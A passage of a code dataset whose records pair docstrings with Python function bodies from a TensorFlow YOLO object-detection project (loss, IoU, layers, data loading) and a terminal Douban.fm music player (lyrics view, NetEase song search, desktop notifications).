CELL_SIZE, BOXES_PER_CELL]\nI = iou_predict_truth * tf.reshape(response, (self.cell_size, self.cell_size, 1))\n\nmax_I = tf.reduce_max(I, 2, keep_dims=True)\n\nI = tf.cast((I >= max_I), tf.float32) * tf.reshape(response, (self.cell_size, self.cell_size, 1))\n\n#calculate no_I tensor [CELL_SIZE, CELL_SIZE, BOXES_PER_CELL]\nno_I = tf.ones_like(I, dtype=tf.float32) - I \n\n\np_C = predict[:, :, self.num_classes:self.num_classes + self.boxes_per_cell]\n\n#calculate truth x,y,sqrt_w,sqrt_h 0-D\nx = label[0]\ny = label[1]\n\nsqrt_w = tf.sqrt(tf.abs(label[2]))\nsqrt_h = tf.sqrt(tf.abs(label[3]))\n#sqrt_w = tf.abs(label[2])\n#sqrt_h = tf.abs(label[3])\n\n#calculate predict p_x, p_y, p_sqrt_w, p_sqrt_h 3-D [CELL_SIZE, CELL_SIZE, BOXES_PER_CELL]\np_x = predict_boxes[:, :, :, 0]\np_y = predict_boxes[:, :, :, 1]\n\n#p_sqrt_w = tf.sqrt(tf.abs(predict_boxes[:, :, :, 2])) * ((tf.cast(predict_boxes[:, :, :, 2] > 0, tf.float32) * 2) - 1)\n#p_sqrt_h = tf.sqrt(tf.abs(predict_boxes[:, :, :, 3])) * ((tf.cast(predict_boxes[:, :, :, 3] > 0, tf.float32) * 2) - 1)\n#p_sqrt_w = tf.sqrt(tf.maximum(0.0, predict_boxes[:, :, :, 2]))\n#p_sqrt_h = tf.sqrt(tf.maximum(0.0, predict_boxes[:, :, :, 3]))\n#p_sqrt_w = predict_boxes[:, :, :, 2]\n#p_sqrt_h = predict_boxes[:, :, :, 3]\np_sqrt_w = tf.sqrt(tf.minimum(self.image_size * 1.0, tf.maximum(0.0, predict_boxes[:, :, :, 2])))\np_sqrt_h = tf.sqrt(tf.minimum(self.image_size * 1.0, tf.maximum(0.0, predict_boxes[:, :, :, 3])))\n#calculate truth p 1-D tensor [NUM_CLASSES]\nP = tf.one_hot(tf.cast(label[4], tf.int32), self.num_classes, dtype=tf.float32)\n\n#calculate predict p_P 3-D tensor [CELL_SIZE, CELL_SIZE, NUM_CLASSES]\np_P = predict[:, :, 0:self.num_classes]\n\n#class_loss\nclass_loss = tf.nn.l2_loss(tf.reshape(objects, (self.cell_size, self.cell_size, 1)) * (p_P - P)) * self.class_scale\n#class_loss = tf.nn.l2_loss(tf.reshape(response, (self.cell_size, self.cell_size, 1)) * (p_P - P)) * self.class_scale\n\n#object_loss\nobject_loss = tf.nn.l2_loss(I * (p_C - C)) * self.object_scale\n#object_loss = tf.nn.l2_loss(I * (p_C - (C + 1.0)/2.0)) * self.object_scale\n\n#noobject_loss\n#noobject_loss = tf.nn.l2_loss(no_I * (p_C - C)) * self.noobject_scale\nnoobject_loss = tf.nn.l2_loss(no_I * (p_C)) * self.noobject_scale\n\n#coord_loss\ncoord_loss = (tf.nn.l2_loss(I * (p_x - x)/(self.image_size/self.cell_size)) +\n             tf.nn.l2_loss(I * (p_y - y)/(self.image_size/self.cell_size)) +\n             tf.nn.l2_loss(I * (p_sqrt_w - sqrt_w))/ self.image_size +\n             tf.nn.l2_loss(I * (p_sqrt_h - sqrt_h))/self.image_size) * self.coord_scale\n\nnilboy = I\n\nreturn num + 1, object_num, [loss[0] + class_loss, loss[1] + object_loss, loss[2] + noobject_loss, loss[3] + coord_loss], predict, labels, nilboy", "path": "yolo\\net\\yolo_net.py", "repo_name": "nilboy/tensorflow-yolo", "stars": 777, "license": "None", "language": "python", "size": 110}
{"docstring": "\"\"\"\ncommon_params: a params dict\nnet_params: a params dict\n\"\"\"\n#pretrained variable collection\n", "func_signal": "def __init__(self, common_params, net_params):\n", "code": "self.pretrained_collection = []\n#trainable variable collection\nself.trainable_collection = []", "path": "yolo\\net\\net.py", "repo_name": "nilboy/tensorflow-yolo", "stars": 777, "license": "None", "language": "python", "size": 110}
{"docstring": "\"\"\"convert image_path, lables to string \nReturns:\n  string \n\"\"\"\n", "func_signal": "def convert_to_string(image_path, labels):\n", "code": "out_string = ''\nout_string += image_path\nfor label in labels:\n  for i in label:\n    out_string += ' ' + str(i)\nout_string += '\\n'\nreturn out_string", "path": "tools\\preprocess_pascal_voc.py", "repo_name": "nilboy/tensorflow-yolo", "stars": 777, "license": "None", "language": "python", "size": 110}
{"docstring": "# construct graph\n", "func_signal": "def construct_graph(self):\n", "code": "self.global_step = tf.Variable(0, trainable=False)\nself.images = tf.placeholder(tf.float32, (self.batch_size, self.height, self.width, 3))\nself.labels = tf.placeholder(tf.float32, (self.batch_size, self.max_objects, 5))\nself.objects_num = tf.placeholder(tf.int32, (self.batch_size))\n\nself.predicts = self.net.inference(self.images)\nself.total_loss, self.nilboy = self.net.loss(self.predicts, self.labels, self.objects_num)\n\ntf.summary.scalar('loss', self.total_loss)\nself.train_op = self._train()", "path": "yolo\\solver\\yolo_solver.py", "repo_name": "nilboy/tensorflow-yolo", "stars": 777, "license": "None", "language": "python", "size": 110}
{"docstring": "\"\"\"calculate ious\nArgs:\n  boxes1: 4-D tensor [CELL_SIZE, CELL_SIZE, BOXES_PER_CELL, 4]  ====> (x_center, y_center, w, h)\n  boxes2: 1-D tensor [4] ===> (x_center, y_center, w, h)\nReturn:\n  iou: 3-D tensor [CELL_SIZE, CELL_SIZE, BOXES_PER_CELL]\n\"\"\"\n", "func_signal": "def iou(self, boxes1, boxes2):\n", "code": "boxes1 = tf.pack([boxes1[:, :, :, 0] - boxes1[:, :, :, 2] / 2, boxes1[:, :, :, 1] - boxes1[:, :, :, 3] / 2,\n                  boxes1[:, :, :, 0] + boxes1[:, :, :, 2] / 2, boxes1[:, :, :, 1] + boxes1[:, :, :, 3] / 2])\nboxes1 = tf.transpose(boxes1, [1, 2, 3, 0])\nboxes2 =  tf.pack([boxes2[0] - boxes2[2] / 2, boxes2[1] - boxes2[3] / 2,\n                  boxes2[0] + boxes2[2] / 2, boxes2[1] + boxes2[3] / 2])\n\n#calculate the left up point\nlu = tf.maximum(boxes1[:, :, :, 0:2], boxes2[0:2])\nrd = tf.minimum(boxes1[:, :, :, 2:], boxes2[2:])\n\n#intersection\nintersection = rd - lu \n\ninter_square = intersection[:, :, :, 0] * intersection[:, :, :, 1]\n\nmask = tf.cast(intersection[:, :, :, 0] > 0, tf.float32) * tf.cast(intersection[:, :, :, 1] > 0, tf.float32)\n\ninter_square = mask * inter_square\n\n#calculate the boxs1 square and boxs2 square\nsquare1 = (boxes1[:, :, :, 2] - boxes1[:, :, :, 0]) * (boxes1[:, :, :, 3] - boxes1[:, :, :, 1])\nsquare2 = (boxes2[2] - boxes2[0]) * (boxes2[3] - boxes2[1])\n\nreturn inter_square/(square1 + square2 - inter_square + 1e-6)", "path": "yolo\\net\\yolo_net.py", "repo_name": "nilboy/tensorflow-yolo", "stars": 777, "license": "None", "language": "python", "size": 110}
{"docstring": "\"\"\"Fully connection layer\n\nArgs:\n  scope: variable_scope name\n  input: [batch_size, ???]\n  out_dimension: int32\nReturn:\n  output: 2-D tensor [batch_size, out_dimension]\n\"\"\"\n", "func_signal": "def local(self, scope, input, in_dimension, out_dimension, leaky=True, pretrain=True, train=True):\n", "code": "with tf.variable_scope(scope) as scope:\n  reshape = tf.reshape(input, [tf.shape(input)[0], -1])\n\n  weights = self._variable_with_weight_decay('weights', shape=[in_dimension, out_dimension],\n                      stddev=0.04, wd=self.weight_decay, pretrain=pretrain, train=train)\n  biases = self._variable_on_cpu('biases', [out_dimension], tf.constant_initializer(0.0), pretrain, train)\n  local = tf.matmul(reshape, weights) + biases\n\n  if leaky:\n    local = self.leaky_relu(local)\n  else:\n    local = tf.identity(local, name=scope.name)\n\nreturn local", "path": "yolo\\net\\net.py", "repo_name": "nilboy/tensorflow-yolo", "stars": 777, "license": "None", "language": "python", "size": 110}
{"docstring": "#process params\n", "func_signal": "def __init__(self, dataset, net, common_params, solver_params):\n", "code": "self.moment = float(solver_params['moment'])\nself.learning_rate = float(solver_params['learning_rate'])\nself.batch_size = int(common_params['batch_size'])\nself.height = int(common_params['image_size'])\nself.width = int(common_params['image_size'])\nself.max_objects = int(common_params['max_objects_per_image'])\nself.pretrain_path = str(solver_params['pretrain_model_path'])\nself.train_dir = str(solver_params['train_dir'])\nself.max_iterators = int(solver_params['max_iterators'])\n#\nself.dataset = dataset\nself.net = net\n#construct graph\nself.construct_graph()", "path": "yolo\\solver\\yolo_solver.py", "repo_name": "nilboy/tensorflow-yolo", "stars": 777, "license": "None", "language": "python", "size": 110}
{"docstring": "\"\"\"get batch\nReturns:\n  images: 4-D ndarray [batch_size, height, width, 3]\n  labels: 3-D ndarray [batch_size, max_objects, 5]\n  objects_num: 1-D ndarray [batch_size]\n\"\"\"\n", "func_signal": "def batch(self):\n", "code": "images = []\nlabels = []\nobjects_num = []\nfor i in range(self.batch_size):\n  image, label, object_num = self.image_label_queue.get()\n  images.append(image)\n  labels.append(label)\n  objects_num.append(object_num)\nimages = np.asarray(images, dtype=np.float32)\nimages = images/255 * 2 - 1\nlabels = np.asarray(labels, dtype=np.float32)\nobjects_num = np.asarray(objects_num, dtype=np.int32)\nreturn images, labels, objects_num", "path": "yolo\\dataset\\text_dataset.py", "repo_name": "nilboy/tensorflow-yolo", "stars": 777, "license": "None", "language": "python", "size": 110}
{"docstring": "\"\"\"max_pool layer\n\nArgs:\n  input: 4-D tensor [batch_zie, height, width, depth]\n  kernel_size: [k_height, k_width]\n  stride: int32\nReturn:\n  output: 4-D tensor [batch_size, height/stride, width/stride, depth]\n\"\"\"\n", "func_signal": "def max_pool(self, input, kernel_size, stride):\n", "code": "return tf.nn.max_pool(input, ksize=[1, kernel_size[0], kernel_size[1], 1], strides=[1, stride, stride, 1],\n              padding='SAME')", "path": "yolo\\net\\net.py", "repo_name": "nilboy/tensorflow-yolo", "stars": 777, "license": "None", "language": "python", "size": 110}
{"docstring": "\"\"\"process configure file to generate CommonParams, DataSetParams, NetParams \n\nArgs:\n  conf_file: configure file path \nReturns:\n  CommonParams, DataSetParams, NetParams, SolverParams\n\"\"\"\n", "func_signal": "def process_config(conf_file):\n", "code": "common_params = {}\ndataset_params = {}\nnet_params = {}\nsolver_params = {}\n\n#configure_parser\nconfig = ConfigParser.ConfigParser()\nconfig.read(conf_file)\n\n#sections and options\nfor section in config.sections():\n  #construct common_params\n  if section == 'Common':\n    for option in config.options(section):\n      common_params[option] = config.get(section, option)\n  #construct dataset_params\n  if section == 'DataSet':\n    for option in config.options(section):\n      dataset_params[option] = config.get(section, option)\n  #construct net_params\n  if section == 'Net':\n    for option in config.options(section):\n      net_params[option] = config.get(section, option)\n  #construct solver_params\n  if section == 'Solver':\n    for option in config.options(section):\n      solver_params[option] = config.get(section, option)\n\nreturn common_params, dataset_params, net_params, solver_params", "path": "yolo\\utils\\process_config.py", "repo_name": "nilboy/tensorflow-yolo", "stars": 777, "license": "None", "language": "python", "size": 110}
{"docstring": "\"\"\"Helper to create an initialized Variable with weight decay.\n\nNote that the Variable is initialized with truncated normal distribution\nA weight decay is added only if one is specified.\n\nArgs:\n  name: name of the variable \n  shape: list of ints\n  stddev: standard devision of a truncated Gaussian\n  wd: add L2Loss weight decay multiplied by this float. If None, weight \n  decay is not added for this Variable.\n\n   Returns:\n  Variable Tensor \n\"\"\"\n", "func_signal": "def _variable_with_weight_decay(self, name, shape, stddev, wd, pretrain=True, train=True):\n", "code": "var = self._variable_on_cpu(name, shape,\n  tf.truncated_normal_initializer(stddev=stddev, dtype=tf.float32), pretrain, train)\nif wd is not None:\n  weight_decay = tf.multiply(tf.nn.l2_loss(var), wd, name='weight_loss')\n  tf.add_to_collection('losses', weight_decay)\nreturn var", "path": "yolo\\net\\net.py", "repo_name": "nilboy/tensorflow-yolo", "stars": 777, "license": "None", "language": "python", "size": 110}
{"docstring": "\"\"\"Add Loss to all the trainable variables\n\nArgs:\n  predicts: 4-D tensor [batch_size, cell_size, cell_size, 5 * boxes_per_cell]\n  ===> (num_classes, boxes_per_cell, 4 * boxes_per_cell)\n  labels  : 3-D tensor of [batch_size, max_objects, 5]\n  objects_num: 1-D tensor [batch_size]\n\"\"\"\n", "func_signal": "def loss(self, predicts, labels, objects_num):\n", "code": "class_loss = tf.constant(0, tf.float32)\nobject_loss = tf.constant(0, tf.float32)\nnoobject_loss = tf.constant(0, tf.float32)\ncoord_loss = tf.constant(0, tf.float32)\nloss = [0, 0, 0, 0]\nfor i in range(self.batch_size):\n  predict = predicts[i, :, :, :]\n  label = labels[i, :, :]\n  object_num = objects_num[i]\n  nilboy = tf.ones([7,7,2])\n  tuple_results = tf.while_loop(self.cond1, self.body1, [tf.constant(0), object_num, [class_loss, object_loss, noobject_loss, coord_loss], predict, label, nilboy])\n  for j in range(4):\n    loss[j] = loss[j] + tuple_results[2][j]\n  nilboy = tuple_results[5]\n\ntf.add_to_collection('losses', (loss[0] + loss[1] + loss[2] + loss[3])/self.batch_size)\n\ntf.scalar_summary('class_loss', loss[0]/self.batch_size)\ntf.scalar_summary('object_loss', loss[1]/self.batch_size)\ntf.scalar_summary('noobject_loss', loss[2]/self.batch_size)\ntf.scalar_summary('coord_loss', loss[3]/self.batch_size)\ntf.scalar_summary('weight_loss', tf.add_n(tf.get_collection('losses')) - (loss[0] + loss[1] + loss[2] + loss[3])/self.batch_size )\n\nreturn tf.add_n(tf.get_collection('losses'), name='total_loss'), nilboy", "path": "yolo\\net\\yolo_net.py", "repo_name": "nilboy/tensorflow-yolo", "stars": 777, "license": "None", "language": "python", "size": 110}
{"docstring": "\"\"\"leaky relu \nif x > 0:\n  return x\nelse:\n  return alpha * x\nArgs:\n  x : Tensor\n  alpha: float\nReturn:\n  y : Tensor\n\"\"\"\n", "func_signal": "def leaky_relu(self, x, alpha=0.1, dtype=tf.float32):\n", "code": "x = tf.cast(x, dtype=dtype)\nbool_mask = (x > 0)\nmask = tf.cast(bool_mask, dtype=dtype)\nreturn 1.0 * mask * x + alpha * (1 - mask) * x", "path": "yolo\\net\\net.py", "repo_name": "nilboy/tensorflow-yolo", "stars": 777, "license": "None", "language": "python", "size": 110}
{"docstring": "\"\"\"Train model\n\nCreate an optimizer and apply to all trainable variables.\n\nArgs:\n  total_loss: Total loss from net.loss()\n  global_step: Integer Variable counting the number of training steps\n  processed\nReturns:\n  train_op: op for training\n\"\"\"\n\n", "func_signal": "def _train(self):\n", "code": "opt = tf.train.MomentumOptimizer(self.learning_rate, self.moment)\ngrads = opt.compute_gradients(self.total_loss)\n\napply_gradient_op = opt.apply_gradients(grads, global_step=self.global_step)\n\nreturn apply_gradient_op", "path": "yolo\\solver\\yolo_solver.py", "repo_name": "nilboy/tensorflow-yolo", "stars": 777, "license": "None", "language": "python", "size": 110}
{"docstring": "\"\"\"Helper to create a Variable stored on CPU memory.\n\nArgs:\n  name: name of the Variable\n  shape: list of ints\n  initializer: initializer of Variable\n\nReturns:\n  Variable Tensor\n\"\"\"\n", "func_signal": "def _variable_on_cpu(self, name, shape, initializer, pretrain=True, train=True):\n", "code": "with tf.device('/cpu:0'):\n  var = tf.get_variable(name, shape, initializer=initializer, dtype=tf.float32)\n  if pretrain:\n    self.pretrained_collection.append(var)\n  if train:\n    self.trainable_collection.append(var)\nreturn var", "path": "yolo\\net\\net.py", "repo_name": "nilboy/tensorflow-yolo", "stars": 777, "license": "None", "language": "python", "size": 110}
{"docstring": "\"\"\"parse xml_file\n\nArgs:\n  xml_file: the input xml file path\n\nReturns:\n  image_path: string\n  labels: list of [xmin, ymin, xmax, ymax, class]\n\"\"\"\n", "func_signal": "def parse_xml(xml_file):\n", "code": "tree = ET.parse(xml_file)\nroot = tree.getroot()\nimage_path = ''\nlabels = []\n\nfor item in root:\n  if item.tag == 'filename':\n    image_path = os.path.join(DATA_PATH, 'VOC2007/JPEGImages', item.text)\n  elif item.tag == 'object':\n    obj_name = item[0].text\n    obj_num = classes_num[obj_name]\n    xmin = int(item[4][0].text)\n    ymin = int(item[4][1].text)\n    xmax = int(item[4][2].text)\n    ymax = int(item[4][3].text)\n    labels.append([xmin, ymin, xmax, ymax, obj_num])\n  \nreturn image_path, labels", "path": "tools\\preprocess_pascal_voc.py", "repo_name": "nilboy/tensorflow-yolo", "stars": 777, "license": "None", "language": "python", "size": 110}
{"docstring": "\"\"\"\nArgs:\n  common_params: A dict\n  dataset_params: A dict\n\"\"\"\n#process params\n", "func_signal": "def __init__(self, common_params, dataset_params):\n", "code": "self.data_path = str(dataset_params['path'])\nself.width = int(common_params['image_size'])\nself.height = int(common_params['image_size'])\nself.batch_size = int(common_params['batch_size'])\nself.thread_num = int(dataset_params['thread_num'])\nself.max_objects = int(common_params['max_objects_per_image'])\n\n#record and image_label queue\nself.record_queue = Queue(maxsize=10000)\nself.image_label_queue = Queue(maxsize=512)\n\nself.record_list = []  \n\n# filling the record_list\ninput_file = open(self.data_path, 'r')\n\nfor line in input_file:\n  line = line.strip()\n  ss = line.split(' ')\n  ss[1:] = [float(num) for num in ss[1:]]\n  self.record_list.append(ss)\n\nself.record_point = 0\nself.record_number = len(self.record_list)\n\nself.num_batch_per_epoch = int(self.record_number / self.batch_size)\n\nt_record_producer = Thread(target=self.record_producer)\nt_record_producer.daemon = True \nt_record_producer.start()\n\nfor i in range(self.thread_num):\n  t = Thread(target=self.record_customer)\n  t.daemon = True\n  t.start()", "path": "yolo\\dataset\\text_dataset.py", "repo_name": "nilboy/tensorflow-yolo", "stars": 777, "license": "None", "language": "python", "size": 110}
{"docstring": "\"\"\"\ncommon params: a params dict\nnet_params   : a params dict\n\"\"\"\n", "func_signal": "def __init__(self, common_params, net_params, test=False):\n", "code": "super(YoloNet, self).__init__(common_params, net_params)\n#process params\nself.image_size = int(common_params['image_size'])\nself.num_classes = int(common_params['num_classes'])\nself.cell_size = int(net_params['cell_size'])\nself.boxes_per_cell = int(net_params['boxes_per_cell'])\nself.batch_size = int(common_params['batch_size'])\nself.weight_decay = float(net_params['weight_decay'])\n\nif not test:\n  self.object_scale = float(net_params['object_scale'])\n  self.noobject_scale = float(net_params['noobject_scale'])\n  self.class_scale = float(net_params['class_scale'])\n  self.coord_scale = float(net_params['coord_scale'])", "path": "yolo\\net\\yolo_net.py", "repo_name": "nilboy/tensorflow-yolo", "stars": 777, "license": "None", "language": "python", "size": 110}
{"docstring": "\"\"\"\n\u8fd4\u56de\u603b\u5b57\u7b26\u6570(\u8003\u8651\u82f1\u6587\u548c\u4e2d\u6587\u5728\u7ec8\u7aef\u6240\u5360\u5b57\u5757)\n\nreturn: int\n\"\"\"\n", "func_signal": "def center_num(self, string):\n", "code": "l = 0\nfor i in string:\n    l += 2 if self.is_cn_char(i) else 1\nreturn l", "path": "doubanfm\\views\\base_view.py", "repo_name": "taizilongxu/douban.fm", "stars": 788, "license": "mit", "language": "python", "size": 47135}
{"docstring": "\"\"\"\n\u6807\u9898\u65f6\u95f4\u663e\u793a\n\"\"\"\n", "func_signal": "def _watchdog_time(self):\n", "code": "while not self.quit:\n    self.data.time = self.player.time_pos\n    self.view.display()\n    time.sleep(1)", "path": "doubanfm\\controller\\manager_controller.py", "repo_name": "taizilongxu/douban.fm", "stars": 788, "license": "mit", "language": "python", "size": 47135}
{"docstring": "# \u684c\u9762\u901a\u77e5\n", "func_signal": "def __init__(self):\n", "code": "self._tempdir = tempfile.mkdtemp()\nself.cover_file = None\nself.has_cover = False\nself.title = None", "path": "doubanfm\\notification.py", "repo_name": "taizilongxu/douban.fm", "stars": 788, "license": "mit", "language": "python", "size": 47135}
{"docstring": "\"\"\"\u901a\u8fc7\u6b4c\u8bcd\u751f\u6210\u5c4f\u5e55\u9700\u8981\u663e\u793a\u7684\u5185\u5bb9\"\"\"\n", "func_signal": "def make_display_lines(self):\n", "code": "self.screen_height, self.screen_width = self.linesnum()  # \u5c4f\u5e55\u663e\u793a\u884c\u6570\n\ndisplay_lines = ['']\ndisplay_lines.append(self._title + '\\r')\ndisplay_lines.append('')\n\nscroll_line_num = self.screen_height - 6\nfor linenum in range(scroll_line_num):\n    if scroll_line_num//2 - linenum > self.markline - self.topline or \\\n            linenum - scroll_line_num//2 >= len(self._lines) - self.markline:\n        display_lines.append('\\r')\n    else:\n        line = self._lines[self.markline - (scroll_line_num//2 - linenum)]\n        line = line.strip('\\n')\n        l = self.center_num(line)\n        flag_num = (self.screen_width - l) // 2\n        if linenum == scroll_line_num//2:\n            i = color_func(self.c['LRC']['highlight'])(line)\n            display_lines.append(' ' * flag_num + i + '\\r')\n        else:\n            line = color_func(self.c['LRC']['line'])(line)\n            display_lines.append(' ' * flag_num + line + '\\r')\n\ndisplay_lines.append('')  # \u7a7a\u884c\ndisplay_lines.append(self.center_suffix_selected() + '\\r')  # \u6b4c\u8bcd\u9875\u9762\u6807\u9898\n\nself.display_lines = display_lines", "path": "doubanfm\\views\\lrc_view.py", "repo_name": "taizilongxu/douban.fm", "stars": 788, "license": "mit", "language": "python", "size": 47135}
{"docstring": "\"\"\"\n\u6839\u636e\u6b4c\u540d\u641c\u7d22320k\u5730\u5740\n\"\"\"\n", "func_signal": "def get_url_and_bitrate(self, song_title):\n", "code": "song_id, bitrate = self.get_song_id(song_title)\nurl = 'http://m1.music.126.net/'\nif song_id:\n    url += self.encrypted_id(song_id) + '/' + str(song_id) + '.mp3'\n    bitrate = str(bitrate/1000)\n    return url, bitrate\nelse:\n    return None, None", "path": "doubanfm\\API\\netease_api.py", "repo_name": "taizilongxu/douban.fm", "stars": 788, "license": "mit", "language": "python", "size": 47135}
{"docstring": "'''\u53d1\u9001\u684c\u9762\u901a\u77e5'''\n", "func_signal": "def send_notification(title=\"Douban.fm\", content=\"\", cover_file=None):\n", "code": "if PLATFORM == 'Linux':\n    send_Linux_notify(title, content, cover_file)\nelif PLATFORM == 'Darwin':\n    send_OS_X_notify(title, content, cover_file)", "path": "doubanfm\\notification.py", "repo_name": "taizilongxu/douban.fm", "stars": 788, "license": "mit", "language": "python", "size": 47135}
{"docstring": "'''\u7b2c\u4e00\u6b21\u684c\u9762\u901a\u77e5\u65f6\u52a0\u5165\u56fe\u7247'''\n\n", "func_signal": "def init_notification(self, playingsong):\n", "code": "logger.debug('init_notification')\n\nold_title = playingsong['title']\nself.cover_file = tempfile.NamedTemporaryFile(\n    suffix='.jpg', dir=self._tempdir)\nif not self.get_pic(playingsong, self.cover_file.name):\n    return\ntitle = playingsong['title']\nif old_title != title:\n    # \u5df2\u5207\u6362\u81f3\u4e0b\u4e00\u9996\u6b4c\n    return\nself.has_cover = True\ncontent = playingsong['artist'] + ' - ' + playingsong['albumtitle']\nsend_notification(title.decode('utf-8'),\n                  content.decode('utf-8'),\n                  self.cover_file.name)", "path": "doubanfm\\notification.py", "repo_name": "taizilongxu/douban.fm", "stars": 788, "license": "mit", "language": "python", "size": 47135}
{"docstring": "\"\"\"\u7b2c\u4e00\u6b21\u8f7d\u5165\u65f6\u67e5\u627e\u6b4c\u8bcd\"\"\"\n", "func_signal": "def find_line(self):\n", "code": "for now_time in reversed(range(self.data.time)):\n    locate = [index for index, i in enumerate(self._sort_lrc_dict)\n              if i[0] == now_time]  # \u67e5\u627e\u6b4c\u8bcd\u5728self.sort_lrc_dict\u4e2d\u7684\u4f4d\u7f6e\n    if locate:\n        return locate[0] + self.lrc_offset\nreturn 0", "path": "doubanfm\\views\\lrc_view.py", "repo_name": "taizilongxu/douban.fm", "stars": 788, "license": "mit", "language": "python", "size": 47135}
{"docstring": "# print >>sys.stderr, \"FATAL:\\n\", s\n", "func_signal": "def __init__(self, s, code=111):\n", "code": "print('FATAL:\\n', s, file=sys.stderr)\nimport traceback\ntraceback.print_stack()\nsys.exit(code)", "path": "doubanfm\\exceptions.py", "repo_name": "taizilongxu/douban.fm", "stars": 788, "license": "mit", "language": "python", "size": 47135}
{"docstring": "'''\u53d1\u9001Mac\u684c\u9762\u901a\u77e5'''\n", "func_signal": "def send_OS_X_notify(title, content, img_path):\n", "code": "try:\n    from Foundation import (\n        NSDate, NSUserNotification, NSUserNotificationCenter)\n    from AppKit import NSImage\n    import objc\nexcept ImportError:\n    logger.info('failed to init OSX notify!')\n    return\n\ndef swizzle(cls, SEL, func):\n    old_IMP = getattr(cls, SEL, None)\n\n    if old_IMP is None:\n        old_IMP = cls.instanceMethodForSelector_(SEL)\n\n    def wrapper(self, *args, **kwargs):\n        return func(self, old_IMP, *args, **kwargs)\n    new_IMP = objc.selector(wrapper, selector=old_IMP.selector,\n                            signature=old_IMP.signature)\n    objc.classAddMethod(cls, SEL.encode(), new_IMP)\n\ndef swizzled_bundleIdentifier(self, original):\n    # Use iTunes icon for notification\n    return 'com.apple.itunes'\n\nswizzle(objc.lookUpClass('NSBundle'),\n        'bundleIdentifier',\n        swizzled_bundleIdentifier)\nnotification = NSUserNotification.alloc().init()\n\nnotification.setTitle_(title)\nnotification.setSubtitle_(content)\nnotification.setInformativeText_('')\nnotification.setUserInfo_({})\nif img_path is not None:\n    image = NSImage.alloc().initWithContentsOfFile_(img_path)\n    # notification.setContentImage_(image)\n    notification.set_identityImage_(image)\nnotification.setDeliveryDate_(\n    NSDate.dateWithTimeInterval_sinceDate_(0, NSDate.date())\n)\nNSUserNotificationCenter.defaultUserNotificationCenter().\\\n    scheduleNotification_(notification)\nlogger.info('send notify success!')", "path": "doubanfm\\notification.py", "repo_name": "taizilongxu/douban.fm", "stars": 788, "license": "mit", "language": "python", "size": 47135}
{"docstring": "\"\"\"\n\u6839\u636e\u6b4c\u66f2\u540d\u641c\u7d22\u6b4c\u66f2\n\n: params : song_title: \u6b4c\u66f2\u540d\n           limit: \u641c\u7d22\u6570\u91cf\n\"\"\"\n", "func_signal": "def search(self, song_title, limit=1):\n", "code": "url = \"http://music.163.com/api/search/pc\"\nheaders = {'Cookie': 'appver=1.5.2',\n           'Referer': 'http://music.163.com'}\npayload = {'s': song_title,\n           'limit': limit,\n           'type': 1}\n\nr = requests.post(url, params=payload, headers=headers)\ndata = json.loads(r.text)\n\nif data['code'] == 200:\n    return data['result']['songs'][0]\nelse:\n    return None", "path": "doubanfm\\API\\netease_api.py", "repo_name": "taizilongxu/douban.fm", "stars": 788, "license": "mit", "language": "python", "size": 47135}
{"docstring": "'''\u83b7\u53d6\u4e13\u8f91\u5c01\u9762'''\n", "func_signal": "def get_pic(self, playingsong, tempfile_path):\n", "code": "url = playingsong['picture'].replace('\\\\', '')\nfor _ in range(3):\n    try:\n        urllib.urlretrieve(url, tempfile_path)\n        logger.debug('Get cover art success!')\n        return True\n    except (IOError, urllib.ContentTooShortError):\n        pass\nlogger.error('Get cover art failed!')\nreturn False", "path": "doubanfm\\notification.py", "repo_name": "taizilongxu/douban.fm", "stars": 788, "license": "mit", "language": "python", "size": 47135}
{"docstring": "\"\"\"\n\u4ecequeue\u91cc\u53d6\u51fa\u5b57\u7b26\u6267\u884c\u547d\u4ee4\n\"\"\"\n", "func_signal": "def _watchdog_queue(self):\n", "code": "while not self.quit:\n    k = self.queue.get()\n    if k == 'q':  # \u9000\u51fa\n        self.quit = True\n        self.switch_queue.put('main')", "path": "doubanfm\\controller\\manager_controller.py", "repo_name": "taizilongxu/douban.fm", "stars": 788, "license": "mit", "language": "python", "size": 47135}
{"docstring": "\"\"\"\n\u5c4f\u5e55\u4e0a\u4e0b\u6eda\u52a8\n\n:params incrment: 1 \u5411\u4e0b\u6eda\u52a8\n                  -1 \u5411\u4e0a\u6eda\u52a8\n\"\"\"\n", "func_signal": "def updown(self, increment):\n", "code": "scroll_line_num = self.screen_height - 4\n# paging\nif increment == -1 and self.markline == 0 and self.topline != 0:\n    self.topline -= 1\nelif increment == 1 and self.markline + self.topline != len(self._lines) - 1 and self.markline == scroll_line_num:\n    self.topline += 1\n# scroll\nif increment == -1 and self.markline != 0:\n    self.markline -= 1\nelif increment == 1 and self.markline != scroll_line_num and self.markline < len(self._lines) - 1:\n    self.markline += 1", "path": "doubanfm\\views\\base_view.py", "repo_name": "taizilongxu/douban.fm", "stars": 788, "license": "mit", "language": "python", "size": 47135}
{"docstring": "\"\"\"\n\u6839\u636e\u6b4c\u540d\u83b7\u53d6\u6b4c\u66f2id\n\"\"\"\n", "func_signal": "def get_song_id(self, song_title):\n", "code": "song = self.search(song_title)\n\nif song.get('hMusic', None):\n    return song['hMusic']['dfsId'], song['hMusic']['bitrate']\nelif song.get('mMusic', None):\n    return song['mMusic']['dfsId'], song['mMusic']['bitrate']\nelif song.get('lMusic', None):\n    return song['lMusic']['dfsId'], song['lMusic']['bitrate']\nreturn None", "path": "doubanfm\\API\\netease_api.py", "repo_name": "taizilongxu/douban.fm", "stars": 788, "license": "mit", "language": "python", "size": 47135}
{"docstring": "# \u6b4c\u66f2\u4fe1\u606f\u5c45\u4e2d\n", "func_signal": "def center_suffix_selected(self):\n", "code": "song = self.data.playingsong\ntmp = (\n    song['title'] +\n    song['albumtitle'] +\n    song['artist']\n).replace('\\\\', '').strip()\nl = self.center_num(tmp)\nl += 2 if song['like'] else 0\nflag_num = (self.screen_width - l - 6) // 2\nreturn ' ' * flag_num + self._suffix_selected + '\\r'  # \u6b4c\u8bcd\u9875\u9762\u6807\u9898", "path": "doubanfm\\views\\lrc_view.py", "repo_name": "taizilongxu/douban.fm", "stars": 788, "license": "mit", "language": "python", "size": 47135}
